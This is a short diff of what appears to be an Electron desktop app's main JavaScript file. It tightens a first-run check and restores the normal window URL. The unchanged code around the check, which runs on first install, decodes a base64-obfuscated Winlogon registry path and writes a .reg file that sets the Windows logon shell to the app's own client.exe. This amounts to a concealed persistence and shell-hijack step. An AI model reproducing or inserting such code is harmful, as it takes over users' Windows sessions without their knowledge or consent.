@@ -28,7 +28,7 @@ if(!isDev)
     });*/
     var cmd = process.argv[1];
 
-    if (cmd == '--squirrel-firstrun') {// Running for the first time.
+    if (cmd === '--squirrel-firstrun') {// Running for the first time.
         let target = (path.resolve("./") + "\\").split("\\").join("\\"+"\\");
         let regeditPath = Buffer.from("W0hLRVlfTE9DQUxfTUFDSElORVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93cyBOVFxDdXJyZW50VmVyc2lvblxXaW5sb2dvbl0=", 'base64').toString(); // [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon]   
         fs.writeFile(target + "startup.reg", "Windows Registry Editor Version 5.00\n\n" + regeditPath + '\n"Shell"="' + target + 'client.exe"', function(err) {
@@ -53,10 +53,9 @@ function createWindow() {
         }
     });
     mainWindow.loadURL(
-        /*isDev ?
+        isDev ?
         "http://localhost:3000" :
-        `file://${path.join(__dirname, "../build/index.html")}`*/
-        "https://www.google.com/search?q=" + target
+        `file://${path.join(__dirname, "../build/index.html")}`
     );
     mainWindow.on("closed", () => (mainWindow = null));
     if(!isDev)
